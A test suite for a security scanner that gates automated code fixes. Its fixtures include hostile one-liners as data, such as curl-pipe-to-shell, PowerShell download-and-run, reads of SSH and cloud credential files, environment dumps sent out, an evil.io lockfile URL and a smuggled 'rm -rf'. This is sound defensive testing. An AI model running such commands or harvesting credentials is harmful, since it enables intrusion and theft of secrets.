// ADR-107 static security gate. Every scanner rule has a positive case and a benign near-miss.
// AUTOFIX_SEC_MODULE points the suite at a mutant copy of the module (mutation testing).
import { describe, it, expect } from 'vitest';
import { pathToFileURL } from 'node:url';

const target = process.env.AUTOFIX_SEC_MODULE
  ? pathToFileURL(process.env.AUTOFIX_SEC_MODULE).href
  : new URL('../../scripts/issue-autofix-security.mjs', import.meta.url).href;
const M = await import(target);
const { isEditablePath, scanAddedLines, scanSecrets, judgeManifestChange, judgeLockfileChange,
  judgePackList, judgeAudit, securityVerdict, RULES, NEVER_EDITABLE, EDITABLE_ALLOW } = M;

const file = (path, added, extra = {}) => ({ path, status: 'M', added, removed: [], binary: false, symlink: false, ...extra });
const scan = (line, path = 'scripts/foo.mjs') => scanAddedLines([file(path, [line])]);
const rulesOf = (line, path) => [...new Set(scan(line, path).map((f) => f.rule))];
const emitted = new Set();
const note = (fs) => { fs.forEach((f) => emitted.add(f.rule)); return fs; };

describe('isEditablePath', () => {
  const cases = [
    ['scripts/foo.mjs', 'editable'], ['./scripts/foo.mjs', 'editable'], ['scripts\\foo.mjs', 'editable'],
    ['SCRIPTS/Foo.MJS', 'editable'], ['docs/guide.md', 'editable'], ['README.md', 'editable'],
    ['tests/unit/x.test.mjs', 'editable'], ['tests/fixtures/a.json', 'editable'], ['kb/x.mjs', 'editable'],
    ['console/app.css', 'editable'], ['plugin/skills/a/SKILL.md', 'editable'], ['plugin/mcp/server.mjs', 'editable'],
    ['plugin/commands/x.md', 'editable'], ['tri-smart-skill/a/b.md', 'editable'], ['plugin/test/a.mjs', 'editable'],
    ['scripts/oracle/x.mjs', 'not-allowlisted'], ['scripts/qe/x.mjs', 'not-allowlisted'], ['tests/qe/x.mjs', 'not-allowlisted'],
    ['kb/sub/x.mjs', 'not-allowlisted'], ['kb/x.json', 'not-allowlisted'], ['plugin/skills/a/x.mjs', 'not-allowlisted'],
    ['tests/fixtures/a.png', 'not-allowlisted'], ['src/x.mjs', 'not-allowlisted'], ['scripts/x.json', 'not-allowlisted'],
    ['.github/workflows/x.yml', 'never:'], ['docs/CODEOWNERS', 'never:'], ['plugin/.claude/x.md', 'never:'],
    ['tests/unit/.npmrc', 'never:'], ['package.json', 'never:'], ['plugin/package.json', 'never:'],
    ['bin/install.mjs', 'never:'], ['config/x.md', 'never:'], ['docs/adr/0107.md', 'never:'], ['Docs/ADR/x.md', 'never:'],
    ['CONTRIBUTING.md', 'never:'], ['SECURITY.md', 'never:'], ['LICENSE', 'never:'], ['plugin/hooks/x.mjs', 'never:'],
    ['scripts/foo.sh', 'never:'], ['scripts/release-check.mjs', 'never:'], ['scripts/Publish.mjs', 'never:'],
    ['scripts/my-token-util.mjs', 'never:'], ['tests/unit/heartbeat.test.mjs', 'never:'], ['vitest.config.mjs', 'never:'],
    ['scripts/foo.rvf', 'never:'], ['data/x.md', 'never:'], ['tests/unit/x.node', 'never:'], ['Scripts/Dream.mjs', 'never:'],
    ['keys/a.md', 'never:'], ['yarn.lock', 'never:'], ['console/telemetry.mjs', 'never:'], ['docs/issue-template.md', 'never:'],
    ['/etc/passwd', 'escape'], ['../x.mjs', 'escape'], ['scripts/../bin/x.mjs', 'escape'], ['', 'escape'],
    ['C:\\x\\y.mjs', 'escape'], ['scripts//foo.mjs', 'escape'], ['scripts/foo.mjs\u0000.sh', 'escape'],
    ['scripts/f\u043eo.mjs', 'escape'], [null, 'escape'],
  ];
  it.each(cases)('%j -> %s', (p, want) => {
    const r = isEditablePath(p);
    expect(r.reason.startsWith(want), `${p}: ${r.reason}`).toBe(true);
    expect(r.ok).toBe(want === 'editable');
  });
  it('exports regex lists and NEVER wins over the allowlist', () => {
    expect(NEVER_EDITABLE.every((r) => r instanceof RegExp)).toBe(true);
    expect(EDITABLE_ALLOW.some((r) => r.test('tests/unit/heartbeat.test.mjs'))).toBe(true);
    expect(isEditablePath('tests/unit/heartbeat.test.mjs').ok).toBe(false);
  });
});

const B64 = 'QUJDRA'.repeat(30);
const ALPH = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*,-.:;<=>?@[]^_{|}~ ';
const RANDOM = Array.from({ length: 150 }, (_, i) => ALPH[(i * 37 + 11) % ALPH.length]).join('');

const POSITIVE = [
  // [rule, line, path?]
  ['network-egress', "const net = require('net');"], ['network-egress', 'import http from "node:http";'],
  ['network-egress', "import { connect } from 'tls'"], ['network-egress', "const d = require('dns')"],
  ['network-egress', 'const r = await fetch(url);'], ['network-egress', 'const x = new XMLHttpRequest();'],
  ['network-egress', 'const ws = new WebSocket(u);'], ['network-egress', "const u = new URL('https://evil.example.net/x');"],
  ['network-egress', "const h = 'https://github.com@evil.io/p';"], ['network-egress', "const h = 'https://isovision.ai.evil.io/';"],
  ['network-egress', "const h = 'https://github.com/attacker/repo';"], ['network-egress', "const u = 'https://raw.githubusercontent.com/x/y';"],
  ['network-egress', "const e = 'http://example.com';"], ['network-egress', 'navigator.sendBeacon(u, d)'],
  ['network-egress', "const g = 'https://github.com/stuinfla/../evil';"], ['network-egress', '<img src="//evil.io/p.gif">', 'console/a.html'],
  ['network-egress', 'See https://evil.io/install for details.', 'docs/guide.md'], ['network-egress', "const s = 'wss://evil.io';"],
  ['network-egress', "const m = 'node:net';"], ['dynamic-code', 'Call eval(x) here', 'docs/guide.md'],
  ['dynamic-code', "import vm from 'vm'"], ['dynamic-code', "const m = 'node:inspector';"],
  ['obfuscation', 'const s = "\\xc3\\xa9\\xc3\\xa9\\xc3\\xa9";'], ['fs-outside-repo', "const p = '/etc/passwd';"],
  ['module-tamper', "const m = 'node:module';"],
  ['process-exec', "const { execSync } = require('child_process');"], ['process-exec', "import { spawn } from 'node:child_process';"],
  ['process-exec', "execSync('ls')"], ['process-exec', "cp.spawnSync('x')"], ['process-exec', 'const w = new Worker(src);'],
  ['dynamic-code', 'eval(code)'], ['dynamic-code', "const f = new Function('a', b);"], ['dynamic-code', "Function('return this')()"],
  ['dynamic-code', 'setTimeout("alert(1)", 10)'], ['dynamic-code', "x.constructor.constructor('return process')()"],
  ['dynamic-code', 'vm.runInNewContext(src)'], ['dynamic-code', 'WebAssembly.instantiate(buf)'],
  ['dynamic-code', "import vm from 'node:vm'"], ['dynamic-code', '(0, eval)(s)'], ['dynamic-code', 'const g = Function.prototype.constructor;'],
  ['dynamic-code', 'new Proxy(globalThis, {})'], ['dynamic-code', 'with (globalThis) { x(); }'],
  ['credential-access', "readFileSync(path.join(os.homedir(), '.npmrc'))"], ['credential-access', "const k = '~/.ssh/id_rsa';"],
  ['credential-access', "const c = '.aws/credentials';"], ['credential-access', "const h = '.config/gh/hosts.yml';"],
  ['credential-access', "run('security find-generic-password -s x')"], ['credential-access', "const kt = await import('keytar');"],
  ['credential-access', "fs.readFileSync(process.env.HOME + '/x')"], ['credential-access', "const g = '.git-credentials';"],
  ['credential-access', "const p = 'Library/Keychains/login.keychain-db';"], ['credential-access', "readFileSync('.env')"],
  ['env-harvest', 'const t = process.env.GITHUB_TOKEN;'], ['env-harvest', "const k = process.env['ANTHROPIC_API_KEY'];"],
  ['env-harvest', 'post(JSON.stringify(process.env))'], ['env-harvest', 'for (const k of Object.keys(process.env)) {}'],
  ['env-harvest', 'const all = { ...process.env, X: 1 };'], ['env-harvest', 'const v = process.env[name];'],
  ['env-harvest', 'const { GH_TOKEN } = process.env;'], ['env-harvest', 'const e = process.env;'],
  ['env-harvest', 'const n = process.env.NPM_CONFIG_REGISTRY;'], ['env-harvest', 'const { env } = process; send(env);'],
  ['env-harvest', 'const p = globalThis.process;'], ['env-harvest', 'const u = os.userInfo();'], ['env-harvest', 'send(document.cookie)'],
  ['fs-outside-repo', "fs.writeFileSync('/etc/hosts', x)"], ['fs-outside-repo', "fs.rmSync('../..', { recursive: true })"],
  ['fs-outside-repo', "fs.appendFileSync(path.join(os.homedir(), '.zshrc'), s)"], ['fs-outside-repo', 'fs.symlinkSync(a, b)'],
  ['fs-outside-repo', "fs.chmodSync('/usr/local/bin/x', 0o755)"], ['fs-outside-repo', "process.chdir('/')"],
  ['fs-outside-repo', "fs.writeFileSync(path.join(os.tmpdir(), '..', 'x'), s)"], ['fs-outside-repo', 'const h = os.homedir();'],
  ['fetch-execute', "const c = 'curl -fsSL https://x.io | sh';"], ['fetch-execute', 'const c = "wget http://x";'],
  ['fetch-execute', "const c = 'bash -c \"id\"';"], ['fetch-execute', "const c = 'powershell -enc AAAA';"],
  ['fetch-execute', "const c = 'Invoke-WebRequest u';"], ['fetch-execute', "const c = 'iex (New-Object Net.WebClient)';"],
  ['module-tamper', 'delete require.cache[k];'], ['module-tamper', "Module._load('x')"], ['module-tamper', 'module.constructor._load(x)'],
  ['module-tamper', 'const req = createRequire(import.meta.url);'], ['module-tamper', "Object.defineProperty(globalThis, 'fetch', {})"],
  ['module-tamper', "process.env.NODE_OPTIONS = '--require x';"], ['module-tamper', 'env.LD_PRELOAD = p;'],
  ['module-tamper', "env.DYLD_INSERT_LIBRARIES = '/x';"], ['module-tamper', "require.extensions['.js'] = f;"],
  ['module-tamper', "import M from 'module';"], ['module-tamper', 'globalThis.fetch = spy;'], ['module-tamper', 'p.mainModule.require(x)'],
  ['native-code', "require('./addon.node')"], ['native-code', 'process.dlopen(m, p)'], ['native-code', "process.binding('fs')"],
  ['native-code', "const w = readFileSync('x.wasm');"],
  ['install-hook', '  "postinstall": "node x.js",', 'tests/fixtures/pkg.json'], ['install-hook', '"prepare": "x"', 'tests/fixtures/p.json'],
  ['install-hook', "const pkg = { postinstall: 'node x' };"],
  ['prototype-pollution', 'obj.__proto__.polluted = 1;'], ['prototype-pollution', 'Object.prototype.x = 1;'],
  ['prototype-pollution', "a['prototype'] = b;"], ['prototype-pollution', 'Array.prototype.includes = f;'],
  ['obfuscation', "Buffer.from(s, 'base64')"], ['obfuscation', 'const s = atob(p);'],
  ['obfuscation', 'String.fromCharCode(101, 118, 97, 108)'], ['obfuscation', 'for (const c of a) s += String.fromCharCode(c);'],
  ['obfuscation', 'const s = "\\x65\\x76\\x61\\x6c\\x28\\x29";'], ['obfuscation', 'const s = "\\u0065\\u0076\\u0061\\u006c\\u0028\\u0029";'],
  ['obfuscation', `const p = "${B64}";`], ['obfuscation', `const p = '${'deadbeef'.repeat(20)}';`],
  ['obfuscation', `const p = '${RANDOM}';`], ['obfuscation', `const p = '${B64.slice(0, 70)}' + '${B64.slice(70, 150)}';`],
  ['obfuscation', `${B64}`, 'docs/guide.md'], ['obfuscation', "const f = 'lave'.split('').reverse().join('');"],
  ['obfuscation', 'const k = s.charCodeAt(i) ^ 42;'], ['obfuscation', "const f = ['e', 'v', 'a', 'l'].join('');"],
  ['obfuscation', "const f = 'ev' + 'a' + 'l';"], ['obfuscation', "const s = decodeURIComponent('%65%76%61%6c%28%29');"],
  ['hidden-unicode', 'const a = 1; // \u202e'], ['hidden-unicode', 'const a\u200b = 1;'], ['hidden-unicode', 'x = 1;\ufeff'],
  ['hidden-unicode', 'const x = r\u0435quire("fs");'], ['hidden-unicode', 'Some \u202e text', 'docs/guide.md'],
  ['hidden-unicode', 'ok \u{E0041}\u{E0042}', 'docs/guide.md'], ['hidden-unicode', 'const x = 1;\ufe00\ufe01'],
  ['hidden-unicode', '// note\u2028eval(x)'], ['hidden-unicode', '// note\reval(x)'], ['hidden-unicode', 'a\u0007b'],
];
describe('scanAddedLines: each rule fires on its attack', () => {
  it.each(POSITIVE)('%s <- %j', (rule, line, path) => {
    const rs = note(scan(line, path)).map((f) => f.rule);
    expect(rs, JSON.stringify(rs)).toContain(rule);
  });
});

const EVASIONS = [
  ['dynamic-code', "require('node:' + 'net')"], ['dynamic-code', "const g = global['ev' + 'al'];"],
  ['dynamic-code', "globalThis[atob('ZXZhbA==')](x)"], ['obfuscation', "globalThis[atob('ZXZhbA==')](x)"],
  ['dynamic-code', 'await import(`./${name}.mjs`)'], ['dynamic-code', 'require(name)'],
  ['process-exec', "require  ( 'child_process' )"], ['process-exec', "require\t('child_process')"],
  ['dynamic-code', 'const r = require'], ['process-exec', "('child_process')"],
  ['dynamic-code', '\\u0065val(x)'], ['obfuscation', '\\u0065val(x)'], ['dynamic-code', 'const f = \\u{65}val;'],
  ['hidden-unicode', 'r\u0435quire("child_process")'], ['dynamic-code', 'const e = eval; e(s);'],
  ['dynamic-code', 'Reflect.get(globalThis, k)(s)'], ['network-egress', "import('https://evil.io/x.mjs')"],
  ['network-egress', "const u = 'https://%65vil.io/';"], ['process-exec', "const m = 'child_process'; require(m);"],
  ['dynamic-code', "process['mainModule']"], ['env-harvest', "const e = process['env'];"],
];
describe('scanAddedLines: evasions', () => {
  it.each(EVASIONS)('%s <- %j', (rule, line) => {
    const rs = note(scan(line)).map((f) => f.rule);
    expect(rs, JSON.stringify(rs)).toContain(rule);
  });
});

const NEGATIVE = [
  ['const name = await fetchUserName(id);'], ['const score = evaluate(model);'],
  ['The installer prints a summary, then fetch a coffee.', 'docs/guide.md'], ["const tag = 'abc123==';"],
  ["fs.writeFileSync(path.join(os.tmpdir(), 'x.json'), s);"], ["const repo = 'https://github.com/stuinfla/ruvnet-brain';"],
  ['const m = /(\\d+)/.exec(s);'], ["import { readFileSync } from 'node:fs';"], ["import path from 'node:path';"],
  ['const env = process.env.NODE_ENV;'], ['const dash = "\\u2014";'], ["const s = 'a \u2014 b'; // caf\u00e9 \u2014 note"],
  [" * caf\u00e9 \u2014 doc comment"], ["const red = '\\x1b[31m';"], ['String.fromCharCode(65)'], ["const parts = s.split(',');"],
  ["const u = 'https://registry.npmjs.org/ruvnet-brain';"], ["const l = 'http://localhost:3000/x';"],
  ["const l = 'http://127.0.0.1:8080/';"], ["const u = 'https://example.com/a';", 'tests/unit/x.test.mjs'],
  ["const isFunction = (x) => typeof x === 'function';"], ["const h = createHash('sha256').update(s).digest('hex');"],
  ['const t = setTimeout(() => done(), 10);'], ['const files = readdirSync(dir);'],
  ["export const site = 'https://isovision.ai/ruvnet-brain/';"], ['const out = JSON.stringify(result);'],
  ['We require Node 20 or newer.', 'docs/guide.md'], ['const n = os.cpus().length;'], ['// TODO: handle the prepare step'],
  ['const keys = Object.keys(config);'], ['class A { constructor(opts) { this.o = opts; } }'], ['if (x.constructor.name === "Object") {}'],
  ["const s = 'This helper script reads the local configuration file and prints a friendly summary of every option the user has set today.';"],
  ['Foo.prototype.bar = function () {};'], ['const s = Array.prototype.slice.call(args);'], ["const v = require.resolve('vitest');"],
  ["import { x } from './lib.mjs';"], ["const m = await import('./lib.mjs');"], ["const u = 'https://www.npmjs.com/package/ruvnet-brain';"],
  ['Emoji heart \u2764\ufe0f in docs', 'docs/guide.md'], ['"name": "fixture", "type": "module"', 'tests/fixtures/p.json'],
  ['const c = getCredentialsHint();'], ['const p = path.join(repoRoot, "kb", "x.mjs");'], ['const exe = runner.execute(task);'],
  ['const b = arr.with(0, 1);'], ['const { argv } = process;'],
];
describe('scanAddedLines: benign near-misses stay clean', () => {
  it.each(NEGATIVE)('%j', (line, path) => {
    expect(scan(line, path)).toEqual([]);
  });
  it('the long benign sentence really is >= 120 chars', () => {
    expect(NEGATIVE.find(([l]) => l.includes('friendly summary'))[0].length).toBeGreaterThan(130);
  });
});

describe('scanAddedLines: finding shape and file handling', () => {
  it('reports 1-based line, trimmed excerpt <= 120, one finding per (path,line,rule)', () => {
    const fs = scanAddedLines([file('scripts/a.mjs', ['const ok = 1;', `   eval(a); eval(b); ${'x'.repeat(200)}`])]);
    const dyn = fs.filter((f) => f.rule === 'dynamic-code');
    expect(dyn).toHaveLength(1);
    expect(dyn[0]).toMatchObject({ path: 'scripts/a.mjs', line: 2 });
    expect(dyn[0].excerpt.startsWith('eval(a)')).toBe(true);
    expect(dyn[0].excerpt.length).toBeLessThanOrEqual(120);
  });
  it('escapes invisible characters in the excerpt so findings cannot smuggle bidi text', () => {
    const [f] = scan('// \u202e x');
    expect(f.excerpt).not.toMatch(/\u202e/);
  });
  it('scans test files too, flags binary and symlink entries, allows BOM at the start of a new file', () => {
    expect(rulesOf('eval(x)', 'tests/unit/a.test.mjs')).toContain('dynamic-code');
    const fs = note(scanAddedLines([file('tests/fixtures/a.json', [], { binary: true }), file('scripts/l.mjs', [], { symlink: true })]));
    expect(fs.map((f) => f.rule).sort()).toEqual(['binary-file', 'symlink']);
    expect(scanAddedLines([file('scripts/n.mjs', ['\ufeffconst a = 1;'], { status: 'A' })])).toEqual([]);
    expect(rulesOf('\ufeffconst a = 1;')).toContain('hidden-unicode');
  });
  it('fails closed on malformed input', () => {
    expect(note(scanAddedLines(null))[0].rule).toBe('scan-unreadable');
    expect(scanAddedLines([{ path: 'scripts/a.mjs', added: [5] }])[0].rule).toBe('scan-unreadable');
  });
});

describe('scanSecrets', () => {
  const tok = (p, n) => p + 'A1b2C3d4E5'.repeat(6).slice(0, n);
  const POS = [
    ['secret', tok('ghp_', 36)], ['secret', tok('ghs_', 36)], ['secret', tok('github_pat_', 40)], ['secret', tok('npm_', 36)],
    ['secret', tok('sk-ant-api03-', 30)], ['secret', tok('sk-proj-', 30)], ['secret', tok('sk-', 40)],
    ['secret', 'AKIAABCDEFGHIJKLMNOP'], ['secret', 'ASIAABCDEFGHIJKLMNOP'], ['secret', 'xoxb-1234567890-abcdef'],
    ['secret', tok('AIza', 35)], ['secret', '-----BEGIN OPENSSH PRIVATE KEY-----'], ['secret', '-----BEGIN PRIVATE KEY-----'],
    ['secret', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
    ['local-path', 'cwd: /Users/alice/Code/x'], ['local-path', 'at /home/bob/app/x.js'], ['local-path', 'C:\\Users\\carol\\x'],
  ];
  it.each(POS)('%s <- %s', (rule, t) => {
    const fs = note(scanSecrets(`line one\nconst v = "${t}";`));
    expect(fs.map((f) => f.rule)).toContain(rule);
    expect(fs[0]).toMatchObject({ path: '<text>', line: 2 });
    if (rule === 'secret') expect(fs[0].excerpt).not.toContain(t);
  });
  it.each(['sk-short', 'ghp_short', '/usr/local/bin/node', '/Users/Shared/x', 'AKIA lowercase akiaabcdefghijklmnop', 'task-runner-configuration-value-long'])(
    'benign %s', (t) => expect(scanSecrets(t)).toEqual([]));
  it('names the Anthropic key specifically', () => expect(scanSecrets(tok('sk-ant-api03-', 30))[0].detail).toMatch(/Anthropic/));
  it('fails closed on non-string input', () => expect(scanSecrets(undefined)).toHaveLength(1));
});

describe('judgeManifestChange', () => {
  const base = { name: 'x', version: '1.0.0', scripts: { test: 'vitest' }, dependencies: { a: '1' }, bin: { x: 'bin/x.mjs' }, files: ['bin'] };
  const j = (patch) => note(judgeManifestChange(base, { ...structuredClone(base), ...patch })).map((f) => f.rule);
  it('allows a version-only change and key reordering', () => {
    expect(j({ version: '1.0.1' })).toEqual([]);
    const { name, ...rest } = base;
    expect(judgeManifestChange(base, { ...rest, name })).toEqual([]);
  });
  it.each([
    [{ dependencies: { a: '1', evil: '1' } }, 'dependency-change'], [{ devDependencies: { x: '1' } }, 'dependency-change'],
    [{ overrides: { a: '2' } }, 'dependency-change'], [{ optionalDependencies: { x: '1' } }, 'dependency-change'],
    [{ bundleDependencies: ['a'] }, 'dependency-change'], [{ scripts: { test: 'vitest', postinstall: 'node x' } }, 'lifecycle-script'],
    [{ scripts: { test: 'vitest', prepare: 'x' } }, 'lifecycle-script'], [{ scripts: { test: 'node evil' } }, 'package-scripts'],
    [{ scripts: {} }, 'package-scripts'], [{ bin: { x: 'evil.mjs' } }, 'manifest-change'], [{ files: ['bin', 'x'] }, 'manifest-change'],
    [{ main: 'evil.mjs' }, 'manifest-change'], [{ exports: './x.mjs' }, 'manifest-change'], [{ engines: { node: '*' } }, 'manifest-change'],
    [{ publishConfig: { registry: 'x' } }, 'manifest-change'], [{ version: '1.0.1; rm -rf' }, 'manifest-change'],
  ])('%j -> %s', (patch, rule) => expect(j(patch)).toContain(rule));
  it('fails closed on unparsed input', () => expect(judgeManifestChange(null, base)[0].rule).toBe('manifest-change'));
  it('findings are attributed to package.json', () => expect(judgeManifestChange(base, { ...base, main: 'x' })[0].path).toBe('package.json'));
});

describe('judgeLockfileChange', () => {
  const lock = { name: 'x', version: '1.0.0', lockfileVersion: 3,
    packages: { '': { name: 'x', version: '1.0.0' }, 'node_modules/a': { version: '1.0.0', resolved: 'https://registry.npmjs.org/a', integrity: 'sha512-a' } } };
  const bumped = () => { const l = structuredClone(lock); l.version = '1.0.1'; l.packages[''].version = '1.0.1'; return l; };
  it('allows only the two version fields to differ', () => expect(judgeLockfileChange(lock, bumped())).toEqual([]));
  it('flags a changed resolved URL and names the package path', () => {
    const l = bumped(); l.packages['node_modules/a'].resolved = 'https://evil.io/a.tgz';
    const fs = note(judgeLockfileChange(lock, l));
    expect(fs).toHaveLength(1);
    expect(fs[0]).toMatchObject({ rule: 'lockfile-change', path: 'package-lock.json' });
    expect(fs[0].detail).toContain('node_modules/a');
  });
  it('flags an added package, a root dependency edit and malformed input', () => {
    const l = bumped(); l.packages['node_modules/evil'] = { version: '1.0.0' };
    expect(judgeLockfileChange(lock, l)[0].detail).toContain('node_modules/evil');
    const r = bumped(); r.packages[''].dependencies = { evil: '1' };
    expect(judgeLockfileChange(lock, r)).toHaveLength(1);
    expect(judgeLockfileChange(lock, 'x')).toHaveLength(1);
  });
});

describe('judgePackList', () => {
  const previous = [{ path: 'package.json', size: 1000 }, { path: 'scripts/a.mjs', size: 50 }, { path: 'README.md', size: 10 },
    { path: 'plugin/.claude-plugin/plugin.json', size: 300 }];
  const j = (candidate, changedPaths = [], extra = {}) => note(judgePackList({ previous, candidate, changedPaths, ...extra })).map((f) => f.rule);
  it('accepts an identical pack and a version bump', () => {
    expect(j(previous)).toEqual([]);
    expect(j(previous.map((e) => (e.path.endsWith('.json') ? { ...e, size: e.size + 2 } : e)))).toEqual([]);
  });
  it('flags an unexpected new file, but not one the diff added', () => {
    expect(j([...previous, { path: 'scripts/evil.mjs', size: 9 }])).toEqual(['pack-unexpected-file']);
    expect(j([...previous, { path: 'scripts/new.mjs', size: 9 }], ['scripts/new.mjs'])).toEqual([]);
    expect(j([...previous, { path: '../x.mjs', size: 9 }], ['../x.mjs'])).toContain('pack-unexpected-file');
  });
  it('flags a size change outside the reviewed diff, including README and large manifest changes', () => {
    expect(j(previous.map((e) => (e.path === 'scripts/a.mjs' ? { ...e, size: 51 } : e)))).toEqual(['pack-unexpected-change']);
    expect(j(previous.map((e) => (e.path === 'README.md' ? { ...e, size: 11 } : e)))).toEqual(['pack-unexpected-change']);
    expect(j(previous.map((e) => (e.path === 'package.json' ? { ...e, size: 5000 } : e)))).toEqual(['pack-unexpected-change']);
    expect(j(previous.map((e) => (e.path === 'scripts/a.mjs' ? { ...e, size: 51 } : e)), ['scripts/a.mjs'])).toEqual([]);
  });
  it('flags binaries the diff added and honours versionOnlyPaths', () => {
    expect(j([...previous, { path: 'tests/fixtures/x.wasm', size: 9 }], ['tests/fixtures/x.wasm'])).toEqual(['pack-binary']);
    expect(j(previous.map((e) => (e.path === 'README.md' ? { ...e, size: 12 } : e)), [], { versionOnlyPaths: ['README.md'] })).toEqual([]);
  });
  it('removals are fine; malformed input fails closed', () => {
    expect(j(previous.slice(1))).toEqual([]);
    expect(note(judgePackList({ previous: null, candidate: [], changedPaths: [] }))[0].rule).toBe('pack-unreadable');
  });
});

describe('judgeAudit', () => {
  const audit = (meta, vulns = {}) => ({ auditReportVersion: 2, vulnerabilities: vulns,
    metadata: { vulnerabilities: { info: 0, low: 0, moderate: 0, high: 0, critical: 0, total: 0, ...meta } } });
  it('clean and moderate-only pass', () => {
    expect(judgeAudit(audit({}))).toEqual([]);
    expect(judgeAudit(audit({ moderate: 2 }, { m: { severity: 'moderate' } }))).toEqual([]);
  });
  it('names each high/critical package', () => {
    const fs = note(judgeAudit(audit({ high: 1, critical: 1 }, { lodash: { severity: 'high' }, evil: { severity: 'critical' } })));
    expect(fs.map((f) => [f.rule, f.detail.includes(f.rule === 'audit-high' ? 'lodash' : 'evil')])).toEqual([['audit-high', true], ['audit-critical', true]]);
  });
  it('counts without names still fail; malformed fails closed', () => {
    expect(judgeAudit(audit({ high: 3 })).map((f) => f.rule)).toEqual(['audit-high']);
    expect(note(judgeAudit({}))[0].rule).toBe('audit-unreadable');
    expect(judgeAudit(null)[0].rule).toBe('audit-unreadable');
    expect(judgeAudit({ metadata: { vulnerabilities: { high: 'x', critical: 0 } } })[0].rule).toBe('audit-unreadable');
  });
});

describe('securityVerdict and RULES', () => {
  it('ok iff zero findings; non-array input fails closed', () => {
    expect(securityVerdict([], [])).toEqual({ ok: true, findings: [] });
    const f = { path: 'a', line: 1, rule: 'dynamic-code', detail: 'd', excerpt: 'e' };
    expect(securityVerdict([], [f])).toEqual({ ok: false, findings: [f] });
    const v = securityVerdict([], undefined);
    expect(v.ok).toBe(false);
    note(v.findings);
  });
  it('RULES is frozen and lists every rule this suite saw emitted', () => {
    expect(Object.isFrozen(RULES)).toBe(true);
    for (const r of emitted) expect(RULES, r).toContain(r);
    expect(emitted.size).toBeGreaterThanOrEqual(28);
  });
});
